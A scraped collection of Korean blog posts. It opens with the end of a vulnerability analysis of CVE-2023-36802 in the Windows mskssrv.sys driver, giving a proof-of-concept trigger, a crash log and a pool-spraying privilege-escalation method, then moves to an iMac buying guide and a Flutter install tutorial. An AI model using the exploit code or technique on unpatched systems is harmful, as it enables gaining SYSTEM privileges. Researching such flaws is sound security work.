이후 추가 유효성 검사 루틴이 있으며, FSContextReg는 FSStreamReg::PublishTx의 첫 번째 인수로 사용될 수 있습니다. 따라서, 타입 혼란 취약점이 발생합니다.\n\n타입 혼란이 발생하면 FSStreamReg::PublishTx는 두 객체 간에 상속 관계가 없더라도 FSContextReg 객체를 FSStreamReg 타입으로 처리할 것입니다.\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n```js\n__int64 __fastcall FSStreamReg::PublishTx(__int64 FsStreamReg, __int64 data)\n{\n  //\n  result = FSStreamReg::CheckRecycle(FsStreamReg, data);\n  ...\n  // 경계를 벗어난 접근\n  kEvent = *(struct _KEVENT **)(FsStreamReg + 0x130);\n  if (kEvent)\n  {\n    KeSetEvent(kEvent, 0, 0);\n    FSFrameMdlobj = 0i64;\nLABEL_21:\n    if (FSFrameMdlobj)\n    {\n      FSFrameMdl::~FSFrameMdl(FSFrameMdlobj);\n      operator delete(FSFrameMdlobj);\n    }\n  }\n  ...\n}\n\n__int64 __fastcall FSStreamReg::CheckRecycle(__int64 this, __int64 data)\n{\n  if (data)\n  {\n    value1 = *(_DWORD *)(data + 0x24);\n    if (value1)\n    {\n      ...\n      // 경계를 벗어난 접근\n      v12 = *(_QWORD *)(this + 0x1B0);\n      v13 = v5 + *(_DWORD *)(this + 0x1BC);\n      v14 = *(int *)(this + 0x1B8);\n  ...\n}\n```\n\n두 객체 간 사이즈 차이로 인해 형태 혼란이 발생하여 경계를 벗어난 접근 취약점이 발생합니다. 공격자는 이러한 기본적인 취약점을 활용하여 메모리 레이아웃을 조작하여 시스템 권한을 획들할 수 있습니다.\n\n# CVE-2023–36802의 패치\n\n```js\n-char __fastcall FSRendezvousServer::FindObject(FSRendezvousServer *this, __int64 FsContext2)\n+char __fastcall FSRendezvousServer::FindStreamObject(FSRendezvousServer *this, __int64 FsContext2)\n{\n  if (FsContext2)\n  {\n-    if (*(_DWORD *)(FsContext2 + 0x30) == 1) // 유형 1 확인\n-    {\n-      FsContextList = (_QWORD *)((char *)this + 0x80);\n-      /* FsContext2를 찾기 위한 링크드 리스트 검색 */\n-    }\n-    else\n+    if (*(_DWORD *)(FsContext2 + 0x30) == 2) // 유형 2 확인\n    {\n      FsStreamList = (_QWORD *)((char *)this + 80);\n      /* FsContext2를 찾기 위한 링크드 리스트 검색 */\n    }\n  }\n  return 0;\n}\n```\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\nFSRendezvousServer::FindObject의 이름이 FSRendezvousServer::FindStreamObject로 변경되었습니다. 이 함수는 타입 번호 2의 FSStreamReg 오브젝트를 탐색합니다.\n\n# 취약점 발생\n\n이 취약점을 발생시키기 위해서는 FSContextReg 오브젝트를 만들어야 합니다. 이 오브젝트는 FSRendezvousServer::InitializeContext에서 생성할 수 있으며, 이 함수는 IoControlCode가 0x2F0400일 때 호출됩니다.\n\n```js\n__int64 __fastcall FSInitializeContextRendezvous(struct _IRP *a1)\n{\n  ...\n  RendezvousServerObj = operator new(0xA0ui64, v3, 0x73767A52u);\n  if(RendezvousServerObj){\n    // RendezvousServerObj 초기화\n  }\n  ServerObj_1C0005048 = RendezvousServerObj_;\n  ...\n  // `FSRendezvousServer::InitializeContext`에서 FSContextReg 오브젝트 생성\n  result = FSRendezvousServer::InitializeContext(RendezvousServerObj, a1);\n  FSRendezvousServer::Release(RendezvousServerObj);\n  return result;\n}\n```\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n그러면 취약한 함수 중 하나를 트리거하여 FSRendezvousServer::PublishTx(0x2F0408), FSRendezvousServer::PublishRx(0x2F040C), FSRendezvousServer::ConsumeTx(0x2F0410), FSRendezvousServer::ConsumeRx(0x2F0414)를 실행합니다.\n\n아래 PoC는 FSStreamReg::PublishRx를 트리거하는 데 사용됩니다.\n\n```js\n#define inputsize 0x100\n#define outputsize 0x100\nint wmain(int argc, wchar_t** argv) {\n  WCHAR DeviceLink[256] = L\"\\\\\\\\?\\\\ROOT#SYSTEM#0000#{3c0d501a-140b-11d1-b40f-00a0c9223196}\\\\{96E080C7-143C-11D1-B40F-00A0C9223196}&{3C0D501A-140B-11D1-B40F-00A0C9223196}\";\n  HANDLE hDevice = NULL;\n  NTSTATUS ntstatus = 0;\n  hDevice = CreateFile(\n    DeviceLink,\n    GENERIC_READ | GENERIC_WRITE,\n    0,\n    NULL,\n    OPEN_EXISTING,\n    0x80,\n    NULL\n  );\n\n  PCHAR inputBuffer = (PCHAR)malloc(inputsize);\n  PCHAR outputBuffer = (PCHAR)malloc(outputsize);\n\n  printf(\"[+] Initialize Rendezvous\\n\");\n  memset(inputBuffer, 0, inputsize);\n  *(DWORD*)(inputBuffer + 0x00) = 0xffffffff; // &1 == Non ZERO\n  *(DWORD64*)(inputBuffer + 0x08) = GetCurrentProcessId(); // Current Process ID\n  *(DWORD64*)(inputBuffer + 0x10) = 0x4343434344444444; // Some Marker\n  *(DWORD64*)(inputBuffer + 0x18) = 0; // 0\n  ntstatus = DeviceIoControl(hDevice, 0x2F0400, inputBuffer, inputsize, outputBuffer, outputsize, NULL, NULL); // FSInitializeContextRendezvous\n\n  printf(\"[+] Publish RX --> Trigger OOB Access Vulnerability\\n\");\n  memset(inputBuffer, 0, inputsize);\n  *(DWORD*)(inputBuffer + 0x20) = 1; // maxCnt\n  *(DWORD*)(inputBuffer + 0x24) = 1; // CNT <= maxCnt\n  *(DWORD64*)(inputBuffer + 0x30) = 0; // Some Value\n  ntstatus = DeviceIoControl(hDevice, 0x2F040C, inputBuffer, inputsize, outputBuffer, outputsize, NULL, NULL); // PublishRx\n}\n```\n\nmskssrv.sys에서 verifier가 활성화되어 있는 경우 충돌이 발생할 수 있습니다.\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n```js\n1: kd> r\nrax=ffffd5019f2d1668 rbx=0000000000000000 rcx=ffffbf8b77206f80\nrdx=ffffbf8b76e02b00 rsi=ffffbf8b77206f80 rdi=0000000000000000\nrip=fffff80ffac9c9f7 rsp=ffffd5019f2d1610 rbp=ffffbf8b77045e78\n r8=0000000000000001  r9=0000000000000001 r10=0000000000000000\nr11=ffffffffffffffff r12=0000000000000000 r13=ffffbf8b76d60cd0\nr14=ffffbf8b77207108 r15=ffffbf8b76e02b00\niopl=0         nv up ei pl nz na pe nc\ncs=0010  ss=0018  ds=002b  es=002b  fs=0053  gs=002b             efl=00040202\nMSKSSRV!FSStreamReg::PublishRx+0x43:\nfffff80f`fac9c9f7 4d3936          cmp     qword ptr [r14],r14 ds:002b:ffffbf8b`77207108=????????????????\n\n1: kd> dq @rcx L18\nffffbf8b`77206f80  fffff80f`fac941b8 ffffbf8b`77204fe0\nffffbf8b`77206f90  ffffbf8b`77204fe0 00000000`00000002\nffffbf8b`77206fa0  ffffbf8b`77206f80 00000000`00000001\nffffbf8b`77206fb0  00000078`00000001 ffffbf8b`7681f300\nffffbf8b`77206fc0  00000000`00000000 ffffbf8b`77204fd0\nffffbf8b`77206fd0  00000000`00000001 00000000`00001b80\nffffbf8b`77206fe0  43434343`44444444 00000000`00000000\nffffbf8b`77206ff0  00000000`00000000 b3b3b3b3`b3b3b3b3\nffffbf8b`77207000  ????????`???????? ????????`????????\nffffbf8b`77207010  ????????`???????? ????????`????????\nffffbf8b`77207020  ????????`???????? ????????`????????\nffffbf8b`77207030  ????????`???????? ????????`????????\n\n1: kd> pr\nKDTARGET: Refreshing KD connection\n\n*** Fatal System Error: 0x00000050\n                       (0xFFFFBF8B77207108,0x0000000000000000,0xFFFFF80FFAC9C9F7,0x0000000000000002)\n\nDriver at fault:\n***   MSKSSRV.sys - Address FFFFF80FFAC9C9F7 base at FFFFF80FFAC90000, DateStamp 75a6d2bb\n.\n\nA fatal system error has occurred.\nDebugger entered on first try; Bugcheck callbacks have not been invoked.\n\nA fatal system error has occurred.\n\nrax=0000000000000000 rbx=0000000000000003 rcx=0000000000000003\nrdx=0000000000000070 rsi=0000000000000000 rdi=ffffd70001988180\nrip=fffff800470171e0 rsp=ffffd5019f2d0a28 rbp=ffffd5019f2d0b90\n r8=0000000000000065  r9=0000000000000000 r10=0000000000000000\nr11=0000000000000010 r12=0000000000000003 r13=ffffbf8b77207108\nr14=000000\n```\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\nFSStreamReg::PublishRx 함수는 적절한 FrameMDL 객체를 찾기 위해 0x188과 0x198 Offset에 접근합니다. 0x188과 0x198 오프셋은 경종 영역(out-of-bound area)에 있으므로, 제어 가능한 값을 넣을 수 있습니다. 따라서 조건을 쉽게 만족시킬 수 있고 임의의 감소 코드를 실행할 수 있습니다([*]). ObfDereferenceObject 함수는 이 위치에 있는 객체의 참조 횟수를 감소시킬 것입니다.\n\n그러나 장애물이 있었습니다. FSContextReg 객체의 크기는 풀 헤더(0x10 바이트)를 포함해 0x90 바이트이므로, LFH (Low Fragmented Heap)를 사용할 것입니다. 이는 0x90 바이트를 할당하여 메모리 레이아웃을 생성해야 함을 의미합니다. 메모리 레이아웃을 만들기 위해 네임드 파이프 객체를 사용할 수 있습니다. 네임드 파이프 객체는 NonPagedPool을 위한 취약점을 이용하기 위해 널리 사용됩니다. 왜냐하면 FSContextReg는 NonPagedPool에 할당되기 때문입니다.\n\n메모리 레이아웃이 네임드 파이프 객체에 의해 조작되면, 아래와 같이 됩니다.\n\n![이미지](/assets/img/2024-05-23-ChainingN-daystoCompromiseAllPart6WindowsKernelLPEGetSYSTEM_1.png)\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n위 그림에서와 같이 사용자가 제어할 수 없는 네임드 파이프 개체의 헤더 영역에는 오프셋 0x1C8이 있습니다. 이 문제를 해결하기 위해 이 상황에 적합한 다른 적절한 개체를 찾아보았고, ThreadName 개체를 발견했습니다.\n\n```js\nNTSTATUS __stdcall NtSetInformationThread(HANDLE ThreadHandle, THREADINFOCLASS ThreadInformationClass, PVOID ThreadInformation, ULONG ThreadInformationLength)\n{\n  ...\n  switch (ThreadInformationClass)\n    ...\n    case ThreadNameInformation:\n      if (ThreadInformationLength == 16)\n      {\n        result = ObReferenceObjectByHandleWithTag(ThreadHandle, 0x400u, (POBJECT_TYPE)PsThreadType, prev_mode, 0x79517350u, &ThreadObj, 0i64);\n        ...\n        // 사용자 주소 유효성 검사 ~~~\n        *(UNICODE_STRING *)ThreadName_Unicode = *(UNICODE_STRING *)ThreadInformation;\n        ...\n        // [1]. 임의 크기의 Non-Paged Pool 할당\n        NameMem = (char *)ExAllocatePoolWithTag(NonPagedPoolNx, ThreadName_Unicode.Length + 16i64, 0x6D4E6854u);\n        ThreadName = (_UNICODE_STRING *)NameMem;\n        if (ThreadName)\n        {\n          // [2]. 사용자 데이터 시작 위치 +0x10\n          NameArea = (wchar_t *)(NameMem + 0x10);\n          ThreadName->Buffer = NameArea;\n          ThreadName->Length = ThreadName_Unicode.Length;\n          ThreadName->MaximumLength = ThreadName_Unicode.Length;\n          // 사용자 데이터를 메모리로 복사\n          memmove(NameArea, ThreadName_Unicode.Buffer, ThreadName_Unicode.Length);\n          ...\n          OldName = ThreadObj->ThreadName;\n          ThreadObj->ThreadName = ThreadName;\n          ...\n          // 이전 이름의 메모리를 해제합니다.\n          if (OldName)\n            ExFreePoolWithTag(OldName, 0x6D4E6854u);\n          ...\n        }\n      }\n  ...\n}\n```\n\nThreadName은 ThreadNameInformation(0x26)을 사용하여 NtSetInformationThread 시스템 호출을 통해 설정할 수 있습니다. 이 개체는 원하는 크기로 NonPagedPool에 할당되며, 이 개체의 데이터는 처음 0x10바이트를 제외하고 완전히 제어 가능합니다 ([2]). 게다가, ThreadName 개체를 해제하는 코드도 있어서 홀을 만드는 데 유용합니다 ([8]).\n\n<img src=\"/assets/img/2024-05-23-ChainingN-daystoCompromiseAllPart6WindowsKernelLPEGetSYSTEM_2.png\" />\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n이 객체를 사용하면 오프셋 0x188 및 0x1C8의 값을 완전히 처리하고 임의의 감소를 성공적으로 발생시킬 수 있습니다. 이 임의의 감소 기본 원리를 통해 현재 스레드 개체의 PreviousMode를 사용자(1)에서 커널(0)으로 변경할 수 있습니다. 여기서 커널 스레드 권한으로 권한 상승을 위한 잘 알려진 방법을 사용할 수 있습니다.\n\nFermium-252: 사이버 위협 인텔리전스 데이터베이스에는 PoC 및 익스플로잇 코드를 비롯한 자세한 정보가 있습니다. Fermium-252 서비스에 관심이 있다면 contacts@theori.io로 문의하십시오.\n\n# 결론\n\n이 게시물에서는 우리의 1일 완전한 체인 익스플로잇의 마지막 시리즈인 CVE-2023-36802의 분석을 제공했습니다. 이 블로그 시리즈가 끝나더라도 우리는 항상 세계의 위협을 분석하고 다른 흥미로운 연구 주제의 다른 블로그 게시물로 돌아올 것입니다.\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n# 참고 자료\n\n- [chompie1337의 GitHub 페이지](https://github.com/chompie1337/Windows_MSKSSRV_LPE_CVE-2023-36802)\n- [Nero22k의 GitHub 페이지](https://github.com/Nero22k/cve-2023-36802)\n- [보안 인텔리전스 기사](https://securityintelligence.com/x-force/critically-close-to-zero-day-exploiting-microsoft-kernel-streaming-service/)\n- [Microsoft 보안 업데이트 - CVE-2023-36802](https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2023-36802)\n- [Google Project Zero의 보고서](https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2023/CVE-2023-36802.html)\n\n🔵 웹사이트: [theori.io](https://theori.io) ✉️ 이메일: vr@theori.io\n","ogImage":{"url":"/assets/img/2024-05-23-ChainingN-daystoCompromiseAllPart6WindowsKernelLPEGetSYSTEM_0.png"},"coverImage":"/assets/img/2024-05-23-ChainingN-daystoCompromiseAllPart6WindowsKernelLPEGetSYSTEM_0.png","tag":["Tech"],"readingTime":19},{"title":"드디어 새로운 iMac이 출시되었습니다 여러분의 iMac을 구매하는 방법을 안내해드립니다","description":"","date":"2024-05-23 15:19","slug":"2024-05-23-FinallyWeHaveaNewiMacHeresHowtoBuyYours","content":"\n<img src=\"/assets/img/2024-05-23-FinallyWeHaveaNewiMacHeresHowtoBuyYours_0.png\" />\n\n오랜만에 업데이트 없이 지내온 애플의 사랑받는 올인원 데스크탑 맥에 새로운 24인치 iMac이 드디어 출시되었습니다.\n\n\"새로운\"이라고 말씀을 드렸는데, 정확히 말하면 \"업그레이드\" 된 제품입니다.\n\n이는 2021년 5월에 출시된 24인치 iMac과 동일한 샤시, 디스플레이 및 포트 상황을 갖추고 있습니다. 다만 이제는 내부에 M3 칩이 들어가 있습니다.\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n애플의 이 새로운 칩은 3나노미터 공정을 기반으로 하여 원래 M1 칩보다 상당한 성능 향상을 제공합니다. 성능 코어는 최대 30% 빨라졌으며, 빠른 신경 엔진이 탑재되었고 GPU는 다른 차원입니다.\n\n하지만 24인치 iMac 중 어떤 버전이 당신에게 적합할까요? 기본 모델인 M3 iMac을 구매해야 할까요, 아니면 사양을 추가해야 할까요? 또한, 애플에 의해 후속 제품으로 대체되고 중단된 지금은 M1 iMac을 저렴한 가격에 구매하는 것이 좋을까요?\n\n이제 알아보겠습니다!\n\n## M1 또는 M3 24인치 iMac?\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\neBay를 짧게 뒤져 보니, £1,000/$1,000 미만에 괜찮은 사양의 중고 24인치 M1 iMac을 구할 수 있다는 것을 알았어요. 하지만 어느 정도 좋은 제품을 찾기 위해 노력해야 합니다.\n\n애플의 재생 제품 스토어를 이용하면 방문 시기에 따라 상당한 할인 혜택을 받을 수 있어요(저장 용량이 512GB인 기본 사양 M1 iMac의 할인액인 £390이 가장 좋은 예시로 보여졌어요).\n\n아마존은 현재 24인치 M1 iMac의 재고가 줄어들고 있는 상황에서 크게 할인해 주지는 않겠지만, M3 iMac이 시판되면 그 후 몇 주 동안 주목하는 것을 추천합니다.\n\n제 경험상, 거의 2년 반된 iMac을 새로운 M3 변형 버전보다 선택하는 것을 정당화할 만한 절약된 가격이 아직은 없어요. 절대적인 깨진 제품을 찾거나 새 iMac이 할 수 있는 범위를 넘어서는 것이 필요하지 않다면요. 일반 관리, 웹 사용, 글쓰기, 가끔 창작 프로젝트에 관여하는 등의 용도라면, M1 플랫폼은 여전히 탁월한 선택이에요.\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n정직하게 말하자면 - 당신은 M3 iMac에 흥미가 많아서 이것을 읽고 있는 거 아니에요?\n\n## M3 iMac: 어떤 칩 구성이 좋을까요?\n\n만약 24인치 iMac을 구매하려고 생각 중이라면, 운이 좋다고 생각하세요. 이 Mac을 위한 칩 구성은 M3 MacBook Pro나 M2 Mac mini에 비해 훨씬 쉽게 탐색할 수 있어요.\n\n기본 모델인 M3 iMac은 8코어 CPU와 8코어 GPU가 탑재돼 있어요. 이것은 £1,399/$1,299에 구매할 수 있으며, 집이나 사무실에서 유용하게 사용할 일반적인 업무용 iMac으로 충분한 성능을 제공할 거에요. 비디오 편집이나 그래픽 집중 작업에 자주 뛰어들 계획이 없다면 더 강력한 것은 필요하지 않아요.\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n원하는 경우 더 많은 금액을 지출하고 싶으시다면 다른 칩 구성이 하나 더 있습니다. 동일한 8코어 CPU를 갖고 있지만, 10코어 GPU로 인해 그래픽 성능이 향상됩니다. 이것은 추가로 £200/$200이 드는데, 이 구성을 위해 따로 업그레이드 받는 유일한 것은 GPU 코어 2개 뿐이라는 점을 중요하게 알아두시기 바랍니다. 이 구성은 동일한 8GB 통합 메모리와 256GB 저장 공간을 갖고 있습니다.\n\n내 의견으로는 이 추가된 GPU 코어 2개는 정말 선택해야 할 가치가 없고, 그래픽 집중적인 작업을 진정으로 많이 하지 않는 이상 그 존재를 느낄 수 있을지도 모릅니다.\n\n저는 24인치 M3 iMac에 할당된 추가 금액을 다른 곳에 쓰시는 것이 더 좋다고 생각합니다. 그러면 나머지 구성 옵션에 대해 이야기해 보겠습니다.\n\n## M3 iMac: 통합 메모리 얼마나 필요한가요?\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\nM3 iMac은 통합 메모리에 대해 세 가지 옵션이 있습니다. 이는 이전의 M1 버전의 16GB 한계를 능가하는 중요한 업그레이드입니다. M3 iMac은 최대 24GB의 통합 메모리로 구성할 수 있습니다.\n\n베이스 모델의 8GB는 생각보다 훨씬 더 많은 것을 할 수 있습니다. 이 기기가 일반 가정 및 사무 업무에서 역할을 할 예정이라면 정말 더 이상 필요하지 않습니다.\n\n투자 가치를 극대화하고 장기적인 사용을 고려하는 사람을 위해, £200/$200을 지불하여 16GB의 통합 메모리를 얻는 것이 현명한 선택일 것입니다. 두 개의 GPU 코어에 동일한 가격을 쓰는 것보다 훨씬 현명한 선택일 것입니다.\n\n24GB에 대해 어떻게 생각하시나요? 만약 그만큼의 메모리가 필요하다는 것을 알고 계신다면, 그만큼의 메모리가 필요한 거죠. 대규모 데이터 집합을 작업하거나 많은 플러그인과 샘플 라이브러리를 사용하여 음악을 제작하는 사람들은 가능한 한 많은 메모리를 원할 것이며, £400/$400 업그레이드는 가치가 있을 것입니다.\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n## M3 iMac: 저장 용량은 얼마인가요?\n\n아이맥은 내장 저장 공간에 너무 많은 돈을 쓸 필요가 거의 없는 맥북이에요. 특히 애플의 SSD 가격을 고려할 때 더욱 그렇습니다.\n\n예를 들어, M3 iMac의 256GB 기본 저장 용량을 512GB로 두 배로 늘리고 싶다면 추가로 $200/£200을 내야 합니다. 비교해보면, 1TB 저장 용량을 가진 삼성 T7 외장 SSD는 약 £80 정도에 구입할 수 있어요. 2TB를 원하시나요? 해당 삼성 T7 버전은 여전히 애플의 제공 제품보다 훨씬 싸구요 (게다가 아이맥은 내장 저장 용량이 1TB를 넘지 않아요).\n\nM3 iMac에 설치된 로컬 앱에 좀 더 여유 공간을 제공하기 위해 512GB 업그레이드를 하는 것은 합리적일 수 있지만, 추가 저장 용량이 필요하다면 언제나 타사 외장 SSD를 구매하는 것을 추천해요. 하더라도 그것들은 더 저렴하고, 크며, 무한히 확장 가능해요. 게다가 빛나는 새로운 iMac 뒤쪽에 깔끔하게 넣어두면 거기 없는 줄 알 거예요.\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n## M3 iMac: 포트와 주변장치\n\n기본 모델 iMac은 두 개의 썬더볼트/USB 4 포트가 포함되어 있습니다. 그 이상을 얻는 유일한 방법은 다음 모델로 업그레이드하는 것인데, 해당 모델은 추가적으로 두 개의 USB 3 포트와 기가비트 이더넷이 전원 공급 장치에 내장되어 있습니다. 후자는 기본 모델에 추가 비용 £30/$30에 설치할 수 있습니다.\n\n주잡기로는 모든 모델에 매직 마우스와 매직 키보드가 포함되어 있습니다. 그러나, 기본 모델의 키보드에는 터치 ID가 포함되어 있지 않습니다. 터치 ID는 상위 구성 단계에서 표준으로 제공됩니다. 만약 기본 모델 M3 iMac에서 터치 ID를 원한다면 추가로 £50/$50을 지불해야 합니다.\n\n네덜란드 키보드는 iMac 선택에 따라 추가 비용이 £30/$30에서 £80/$80까지 발생할 수 있으며, 만약 마우스 대신 트랙패드를 좋아한다면 (강력히 추천드립니다), 해당 비용은 £50/$50이 소요됩니다.\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n내 조언은요? Apple Watch가 있으면 Touch ID를 신경 쓰지 않아도 돼요 (맥을 잠금 해제하는 데 불필요하게 만들어요), 하지만 정말이지 Magic Mouse를 Magic Trackpad로 교체해보세요!\n\n## 결론: 어떤 M3 iMac이 당신에게 적합한가요?\n\n이 구매 가이드가 유용했다면 좋겠네요. 앞서 언급했듯이, 24인치 M3 iMac은 업그레이드 가능한 구성 요소와 구성이 상대적으로 적어 구매하기 쉬운 편이에요.\n\n요약하자면, 심하게 그래픽 집중적인 작업을 하지 않는 한, 기본 M3 칩을 그대로 두고 통합 메모리와 저장 공간 업그레이드에 예산을 집중하세요 (하지만 후자에 좀 지나치게 들어가지는 마세요!).\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n어떤 M1 iMac을 선택하셨나요? 어떤 용도로 사용할 건가요? 아래에서 의견을 공유해주세요!\n\n## 떠나시기 전에\n\n수익을 창출하고 행복한 온라인 크리에이터가 되는 팁을 얻으려면 제 Substack 뉴스레터에 가입해주세요! 이 게시물에는 제휴 링크가 포함되어 있습니다.\n\n원문은 2023년 11월 1일에 https://markellisreviews.com에서 게시되었습니다.\n","ogImage":{"url":"/assets/img/2024-05-23-FinallyWeHaveaNewiMacHeresHowtoBuyYours_0.png"},"coverImage":"/assets/img/2024-05-23-FinallyWeHaveaNewiMacHeresHowtoBuyYours_0.png","tag":["Tech"],"readingTime":7},{"title":"맥용 플러터 설정하기","description":"","date":"2024-05-23 15:18","slug":"2024-05-23-SettingupFlutterforMacOS","content":"\n이 튜토리얼은 MacOS 기기에 플러터를 설치하는 방법을 안내해드립니다. 맥에서 플러터를 사용하는 장점은 안드로이드 및 iOS 앱을 모두 개발할 수 있는 능력입니다.\n\n# 단계\n\n- 다음 명령을 사용하여 터미널을 통해 플러터를 설치합니다:\n\n```js\nbrew install --cask flutter\n```\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n다트와 플러터를 \"/usr/local/bin\"에 설치할 것입니다.\n\n2. 설치를 확인하세요. 다음 명령을 사용하여 누락된 SDK 도구나 요구 사항이 있는지 확인할 수 있습니다.\n\n```js\nflutter doctor\n```\n\n만약 플러터, 다트 및 필요한 도구를 설치했다면 아래 표시된 이미지처럼 보일 것입니다. 초기에는 일부 도구가 누락될 수 있습니다. Step #3를 완료하면 확인 표시가 되어 있을 것입니다.\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n![image](/assets/img/2024-05-23-SettingupFlutterforMacOS_0.png)\n\n3. Android 및 IOS 앱 개발에 필요한 도구 설치하기. 아래의 다음 섹션을 참조하세요.\n\n4. 선택한 IDE에 대한 확장 기능 설치하기.\n\n- Flutter 확장 기능이 포함된 Visual Studio Code 1.77 이상.\n- IntelliJ용 Flutter 플러그인이 포함된 Android Studio 2023.1(하지호그) 이상.\n- IntelliJ 및 Android 플러그인이 모두 포함된 IntelliJ IDEA 2023.1 이상.\n\n<!-- ui-station 사각형 -->\n\n<ins 